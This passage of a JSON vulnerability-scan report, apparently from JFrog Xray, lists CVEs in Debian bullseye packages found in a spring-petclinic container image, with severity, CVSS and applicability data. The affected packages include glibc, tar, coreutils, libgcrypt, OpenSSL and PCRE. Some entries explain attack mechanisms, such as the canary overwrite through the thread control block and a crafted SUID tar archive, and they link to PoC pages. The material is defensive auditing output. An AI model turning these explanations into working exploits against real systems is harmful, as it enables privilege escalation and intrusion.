            "FullDescription": "The [GNU C Library](https://www.gnu.org/s/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nA well-known issue leads to the fact that in applications that call `pthread_create()`, if a large stack buffer overflow occurs, the stack overflow may overwrite both the reference value of the stack canary and the canary that's saved inside the stack-frame. This leads to a complete bypass of the \"stack protector\" mitigation.\n\nSpecifically, The stack protector (\"canary\") should protect an application from been exploited by stack-based buffer overflows. It is placed on stack frame in function prologue and checked with some trusted value in the function epilogue.\n\nFor x86 and x86-64 architecture the canary value is located in structure `tcbhead_t` field `stack_guard`. A Special register ('gs' for i386 and 'fs' for x86-64) keeps a pointer to this structure. The value `tcbhead_t.stack_guard` is compared with one on the stack to detect stack smashing.\n\nNPTL (Native POSIX Threads Library) is the GNU C library POSIX threads implementation that is used on modern Linux systems. When a `pthread` (new thread) is created, it will keep the `tcphead_t` structure in the thread stack. Thus, an attacker can overwrite the \"reference\" stack-canary value (since it's saved on the stack) by means of stack overflow in a new thread.\n\nThis vulnerability was disputed by the libc maintainers, since it is a well-known issue and not a standalone vulnerability but rather a vulnerability in a mitigation mechanism.",
            "Impact": 4,
            "VulnerabilityType": "Filter Bypass",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The PoC demonstrates changing the \"retained\" stack-canary value",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The Libc maintainers treat this issue as a non-security bug, since it is a vulnerability in a post-attack mitigation (not a standalone vulnerability)",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot be exploited on its own, and can only be used as part of an attack chain",
                  "Description": "Exploitation of this issue requires exploiting a different stack-buffer-overflow vulnerability in the target application",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The victim application must call `pthread_create()` and must be vulnerable to a stack-buffer-overflow type of vulnerability",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://sourceware.org/bugzilla/show_bug.cgi?id=22850#c3",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC changing the stack-canary value.",
                  "Url": "https://bases-hacking.org/tcb-overwrite.html",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical write-up",
                  "Url": "https://bases-hacking.org/tcb-overwrite.html",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010022",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-28223",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "debian",
         "summary": "Tar 1.15.1 does not properly warn the user when extracting setuid or setgid files, which may allow local users or remote attackers to gain privileges.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:tar",
         "source_id": "deb://debian:bullseye:tar",
         "source_comp_id": "deb://debian:bullseye:tar:1.34+dfsg-1",
         "component_versions": {
            "id": "debian:bullseye:tar",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2005-2541",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C"
                  }
               ],
               "description": "Tar 1.15.1 does not properly warn the user when extracting setuid or setgid files, which may allow local users or remote attackers to gain privileges.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-28223",
            "VulnerabilityTitle": "",
            "ShortDescription": "Preserving SETUID/SETGID bits when extracting with tar may lead to privilege escalation.",
            "FullDescription": "When running as the \"root\" user, tar will restore by default the original permissions to any extracted files (this can be controlled via the `-p` argument). One of the restored permission bits are the SETUID/SETGID bits which make the extracted executable automatically elevate to \"root\" privileges, regardless of the user that ran the executable.\n\nThis behavior could be an issue when the root user extracts a crafted tar archive, which contains a SUID-enabled malicious executable, that allows privilege escalation.\nDe-facto, this behavior is widely known, documented and accepted behavior, and as such this issue did not receive a fix.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "A root user must extract the \"affected\" tar archive",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a vulnerability in the extracted SETUID program in order to run arbitrary code, or alternatively make the root user extract an attacker-crafted tar archive",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot be exploited on its own, and can only be used as part of an attack chain",
                  "Description": "Simply preserving the SETUID/SETGID bits will not lead to privilege escalation. The extracted program must still have a vulnerability that will allow the unprivileged user to achieve arbitrary (local) code execution",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "Both Red Hat and Debian security trackers disputed the issue, citing \"This is the documented and expected behaviour of tar.\"",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://marc.info/?l=bugtraq&m=112327628230258&w=2",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2005-2541",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84867",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is \"ASLR bypass itself is not a vulnerability.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010025",
                     "cwe": [
                        "CWE-330"
                     ],
                     "cwe_details": {
                        "CWE-330": {
                           "name": "Use of Insufficiently Random Values",
                           "description": "The product uses insufficiently random numbers or values in a security context that depends on unpredictable numbers."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is \"ASLR bypass itself is not a vulnerability.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010025",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84867",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is \"ASLR bypass itself is not a vulnerability.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010025",
                     "cwe": [
                        "CWE-330"
                     ],
                     "cwe_details": {
                        "CWE-330": {
                           "name": "Use of Insufficiently Random Values",
                           "description": "The product uses insufficiently random numbers or values in a security context that depends on unpredictable numbers."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is \"ASLR bypass itself is not a vulnerability.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010025",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84853",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010023",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "8.8/CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010023",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84853",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010023",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "8.8/CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010023",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84852",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010024",
                     "cwe": [
                        "CWE-200"
                     ],
                     "cwe_details": {
                        "CWE-200": {
                           "name": "Exposure of Sensitive Information to an Unauthorized Actor",
                           "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010024",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-84852",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-1010024",
                     "cwe": [
                        "CWE-200"
                     ],
                     "cwe_details": {
                        "CWE-200": {
                           "name": "Exposure of Sensitive Information to an Unauthorized Actor",
                           "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate \"this is being treated as a non-security bug and no real threat.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-1010024",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-702539",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in GNU Coreutils. The sort utility's begfield() function is vulnerable to a heap buffer under-read. The program may access memory outside the allocated buffer if a user runs a crafted command using the traditional key format. A malicious input could lead to a crash or leak sensitive data.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:coreutils",
         "source_id": "deb://debian:bullseye:coreutils",
         "source_comp_id": "deb://debian:bullseye:coreutils:8.32-4+b1",
         "component_versions": {
            "id": "debian:bullseye:coreutils",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-5278"
                  }
               ],
               "description": "A flaw was found in GNU Coreutils. The sort utility's begfield() function is vulnerable to a heap buffer under-read. The program may access memory outside the allocated buffer if a user runs a crafted command using the traditional key format. A malicious input could lead to a crash or leak sensitive data.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-5278",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-65914",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "cipher/elgamal.c in Libgcrypt through 1.8.2, when used to encrypt messages directly, improperly encodes plaintexts, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for Libgcrypt's ElGamal implementation.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgcrypt20",
         "source_id": "deb://debian:bullseye:libgcrypt20",
         "source_comp_id": "deb://debian:bullseye:libgcrypt20:1.8.7-6",
         "component_versions": {
            "id": "debian:bullseye:libgcrypt20",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-6829",
                     "cwe": [
                        "CWE-327"
                     ],
                     "cwe_details": {
                        "CWE-327": {
                           "name": "Use of a Broken or Risky Cryptographic Algorithm",
                           "description": "The product uses a broken or risky cryptographic algorithm or protocol."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "cipher/elgamal.c in Libgcrypt through 1.8.2, when used to encrypt messages directly, improperly encodes plaintexts, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for Libgcrypt's ElGamal implementation.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2018-6829",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-646705",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "debian",
         "summary": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-9143"
                  }
               ],
               "description": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted explicit values for the field polynomial can lead to out-of-bounds memory reads or writes.  Impact summary: Out of bound memory writes can lead to an application crash or even a possibility of a remote code execution, however, in all the protocols involving Elliptic Curve Cryptography that we're aware of, either only \"named curves\" are supported, or, if explicit curve parameters are supported, they specify an X9.62 encoding of binary (GF(2^m)) curves that can't represent problematic input values. Thus the likelihood of existence of a vulnerable application is low.  In particular, the X9.62 encoding is used for ECC keys in X.509 certificates, so problematic inputs cannot occur in the context of processing X.509 certificates.  Any problematic use-cases would have to be using an \"exotic\" curve encoding.  The affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(), and various supporting BN_GF2m_*() functions.  Applications working with \"exotic\" explicit binary (GF(2^m)) curve parameters, that make it possible to represent invalid field polynomials with a zero constant term, via the above or similar APIs, may terminate abruptly as a result of reading or writing outside of array bounds.  Remote code execution cannot easily be ruled out.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-9143",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-646705",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "debian",
         "summary": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-9143"
                  }
               ],
               "description": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted explicit values for the field polynomial can lead to out-of-bounds memory reads or writes.  Impact summary: Out of bound memory writes can lead to an application crash or even a possibility of a remote code execution, however, in all the protocols involving Elliptic Curve Cryptography that we're aware of, either only \"named curves\" are supported, or, if explicit curve parameters are supported, they specify an X9.62 encoding of binary (GF(2^m)) curves that can't represent problematic input values. Thus the likelihood of existence of a vulnerable application is low.  In particular, the X9.62 encoding is used for ECC keys in X.509 certificates, so problematic inputs cannot occur in the context of processing X.509 certificates.  Any problematic use-cases would have to be using an \"exotic\" curve encoding.  The affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(), and various supporting BN_GF2m_*() functions.  Applications working with \"exotic\" explicit binary (GF(2^m)) curve parameters, that make it possible to represent invalid field polynomials with a zero constant term, via the above or similar APIs, may terminate abruptly as a result of reading or writing outside of array bounds.  Remote code execution cannot easily be ruled out.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-9143",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-60415",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX \"-R -L\" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:coreutils",
         "source_id": "deb://debian:bullseye:coreutils",
         "source_comp_id": "deb://debian:bullseye:coreutils:8.32-4+b1",
         "component_versions": {
            "id": "debian:bullseye:coreutils",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2017-18018",
                     "cwe": [
                        "CWE-362"
                     ],
                     "cwe_details": {
                        "CWE-362": {
                           "name": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')",
                           "description": "The product contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "21"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "4.7/CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX \"-R -L\" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2017-18018",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-59582",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In PCRE 8.41, after compiling, a pcretest load test PoC produces a crash overflow in the function match() in pcre_exec.c because of a self-recursive call. NOTE: third parties dispute the relevance of this report, noting that there are options that can be used to limit the amount of stack that is used",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre3",
